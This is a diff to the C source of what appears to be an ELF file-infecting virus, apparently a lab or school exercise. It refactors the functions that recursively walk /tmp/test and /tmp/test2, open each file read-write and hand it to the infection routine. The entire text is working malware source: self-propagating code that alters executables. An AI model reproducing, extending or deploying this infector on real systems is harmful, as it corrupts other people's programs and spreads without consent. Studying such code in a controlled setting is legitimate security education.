@@ -56,13 +56,17 @@ void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 }
 
-void	try_open_file(t_elf *virus_elf, char *file)
+void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 {
 	int				ret;
 	int				fd;
 	t_elf			elf;
 	void			*header[64];
+	char			file[ft_strlen(path) + ft_strlen(filename) + 2];
 
+	ft_strcpy(file, path);
+	ft_strcat(file, "/");
+	ft_strcat(file, filename);
 	fd = open(file, O_RDWR);
 	if (fd > 0)
 	{
@@ -132,31 +136,27 @@ void	try_open_file(t_elf *virus_elf, char *file)
 	}
 }
 
-void	moving_through_path(t_elf *virus_elf, char *path)
+void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 {
 	DIR		*dir;
     struct	dirent *d;
-	int		size;
-	char	*new_path;
+	char	new_path[ft_strlen(path) + ft_strlen(d_name) + 2];
 
-	dir = opendir(path);
+	ft_strcpy(new_path, path);
+	if (strlen(d_name))
+		ft_strcat(new_path, "/");
+	ft_strcat(new_path, d_name);
+	dir = opendir(new_path);
 	if (dir)
 	{
 		while ((d = readdir(dir)))
 		{
 			if (ft_strcmp(d->d_name, ".") && ft_strcmp(d->d_name, ".."))
 			{
-				size = ft_strlen(path) + ft_strlen(d->d_name) + 2;
-				new_path = malloc(size);
-				bzero(new_path, size);
-				strcpy(new_path, path);
-				strcat(new_path, "/");
-				strcat(new_path, d->d_name);
 				if (d->d_type == DT_DIR)
-					moving_through_path(virus_elf, new_path);
+					moving_through_path(virus_elf, new_path, d->d_name);
 				else
-					try_open_file(virus_elf, new_path);
-				free(new_path);
+					try_open_file(virus_elf, new_path, d->d_name);
 			}
 		}
 		closedir(dir);
@@ -200,8 +200,8 @@ int		main(int argc, char *argv[])
 					debug_print_error(0, argv[0], argv[0]);
 				return (1);
 			}
-			moving_through_path(&elf, "/tmp/test");
-			moving_through_path(&elf, "/tmp/test2");
+			moving_through_path(&elf, "/tmp/test", "");
+			moving_through_path(&elf, "/tmp/test2", "");
 			munmap(elf.addr, elf.size);
 			close(fd);
 		}
